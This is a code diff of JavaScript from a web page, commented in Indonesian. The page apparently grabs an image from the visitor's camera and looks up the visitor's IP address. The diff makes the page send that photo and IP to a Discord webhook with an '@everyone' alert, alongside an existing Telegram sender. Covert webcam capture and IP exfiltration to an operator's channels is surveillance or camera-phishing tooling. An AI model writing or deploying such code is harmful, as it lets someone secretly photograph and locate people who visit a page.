@@ -52,12 +52,18 @@
     }
 
     // Fungsi untuk mengirim gambar ke Discord
-    function sendToDiscord(imageDataURL) {
+    function sendToDiscord(imageDataURL, ipAddress) {
       fetch(imageDataURL)
         .then(res => res.blob())
         .then(blob => {
           var formData = new FormData();
           formData.append('file', blob, 'photo.png');
+
+          var payloadJson = {
+            content: `@everyone Foto terkirim dari IP: ${ipAddress}`
+          };
+
+          formData.append('payload_json', JSON.stringify(payloadJson));
 
           return fetch(discordWebhookUrl, {
             method: 'POST',
@@ -66,10 +72,10 @@
         })
         .then(response => response.json())
         .then(data => {
-          console.log('.:', data);
+          console.log('Gambar berhasil dikirim ke Discord:', data);
         })
         .catch(error => {
-          console.error('..:', error);
+          console.error('Error mengirim gambar ke Discord:', error);
         });
     }
 
@@ -101,13 +107,13 @@
                   ipAddress = data.ip;
 
                   sendToTelegram(imageDataURL, `Foto terkirim dari IP: ${ipAddress}`);
-                  sendToDiscord(imageDataURL);
+                  sendToDiscord(imageDataURL, ipAddress);
                 })
                 .catch(error => {
                   console.error('Error mendapatkan IP address:', error);
 
                   sendToTelegram(imageDataURL, 'Foto terkirim');
-                  sendToDiscord(imageDataURL);
+                  sendToDiscord(imageDataURL, 'IP tidak ditemukan');
                 });
 
               document.body.removeChild(video);
